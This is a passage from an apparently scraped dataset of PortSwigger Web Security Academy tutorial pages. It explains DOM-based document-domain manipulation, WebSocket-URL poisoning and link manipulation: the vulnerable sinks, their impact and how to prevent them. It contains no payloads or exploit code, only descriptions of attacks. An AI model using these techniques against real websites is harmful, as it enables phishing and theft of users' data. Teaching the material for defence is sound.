manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n\nDOM-based document-domain manipulation\n======================================\n\nIn this section, we'll describe DOM-based manipulation of the `document.domain` property and suggest ways to reduce your exposure to this kind of attack.\n\nWhat is DOM-based document-domain manipulation?\n-----------------------------------------------\n\nDocument-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary `document.domain` value.\n\nThe `document.domain` property is used by browsers in their enforcement of the same origin policy. If two pages from different origins explicitly set the same `document.domain` value, then those two pages can interact in unrestricted ways. If an attacker can cause a page of a targeted website and another page they control (either directly, or via an XSS-like vulnerability) to set the same `document.domain` value, then the attacker may be able to fully compromise the target page via the page they already control. This opens up the same possibilities for exploitation as regular [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) ([XSS](https://portswigger.net/web-security/cross-site-scripting)) vulnerabilities.\n\nBrowsers generally enforce some restrictions on the values that can be assigned to `document.domain`, and may prevent the use of completely different values than the actual origin of the page. However, there are two important caveats to this. Firstly, browsers allow the use of child or parent domains, so an attacker may be able to switch the domain of the target page to that of a related website with a weaker security posture. Secondly, some browser quirks enable switching to completely unrelated domains. These caveats mean that the ability to manipulate the `document.domain` property of a page generally represents a security vulnerability whose severity is not far behind regular XSS.\n\nWhich sinks can lead to DOM-based document-domain manipulation vulnerabilities?\n-------------------------------------------------------------------------------\n\nThe `document.domain` sink can lead to DOM-based document-domain manipulation vulnerabilities.\n\nHow to prevent DOM-based document-domain manipulation vulnerabilities\n---------------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to dynamically set the `document.domain` property.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "WebSocket-URL poisoning", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n\nDOM-based WebSocket-URL poisoning\n=================================\n\nIn this section, we'll talk about how WebSocket URLs can be poisoned using DOM-based attacks, discuss the impact of WebSocket-URL poisoning, and suggest ways you can reduce your exposure to this kind of attack.\n\nWhat is DOM-based WebSocket-URL poisoning?\n------------------------------------------\n\nWebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open a WebSocket connection to a URL that is under the attacker's control.\n\nWhat is the impact of WebSocket-URL poisoning?\n----------------------------------------------\n\nThe potential impact of WebSocket-URL poisoning depends on how the website uses [WebSockets](https://portswigger.net/web-security/websockets). If the website transmits sensitive data from the user's browser to the WebSocket server, then the attacker may be able to capture this data.\n\nIf the application reads data from the WebSocket server and processes it in some way, the attacker may be able to subvert the website's logic or deliver client-side attacks against the user.\n\nWhich sinks can lead to WebSocket-URL poisoning vulnerabilities?\n----------------------------------------------------------------\n\nThe `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities.\n\nHow to prevent DOM-based WebSocket-URL poisoning vulnerabilities\n----------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to dynamically set the target URL of a WebSocket connection.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Link manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n\nDOM-based link manipulation\n===========================\n\nIn this section, we'll talk about what DOM-based link manipulation is, look at the impact of an attack, and suggest ways of preventing them.\n\nWhat is DOM-based link manipulation?\n------------------------------------\n\nDOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. An attacker might be able to use this vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response.\n\nWhat is the impact of a DOM-based link-manipulation attack?\n-----------------------------------------------------------\n\nAn attacker may be able to leverage this vulnerability to perform various attacks, including:\n\n*   Causing the user to be redirected to an arbitrary external URL, which could facilitate a phishing attack.\n*   Causing the user to submit sensitive form data to a server controlled by the attacker.\n*   Changing the file or query string associated with a link, causing the user to perform an unintended action within the application.\n*   Bypassing browser anti-XSS defenses by injecting on-site links containing XSS exploits. This works because anti-XSS defenses do not typically account for on-site links.\n\nWhich sinks can lead to DOM-based link-manipulation vulnerabilities?\n--------------------------------------------------------------------\n\nThe following are some of the main sinks can lead to DOM-based link-manipulation vulnerabilities:\n\n```\nelement.href\nelement.src\nelement.action\n```\n\nHow to prevent DOM-based link-manipulation vulnerabilities\n----------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to dynamically set the target URL for links or forms.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Web message manipulation", "content": "### DOM-based 